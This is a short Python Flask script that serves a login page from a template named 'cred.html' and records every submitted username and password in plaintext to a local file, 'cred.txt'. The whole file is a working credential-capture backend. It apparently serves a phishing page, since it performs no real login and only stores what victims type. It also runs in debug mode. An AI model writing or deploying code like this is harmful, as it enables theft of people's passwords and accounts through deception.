from flask import Flask, request, render_template
import os

app = Flask(__name__, template_folder=".")

# Serve the login form
@app.route("/")
def index():
    return render_template("cred.html")

# Handle login and log credentials
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # Log credentials to a file
    with open("cred.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return "Credentials logged successfully!"

if __name__ == "__main__":
    app.run(debug=True)
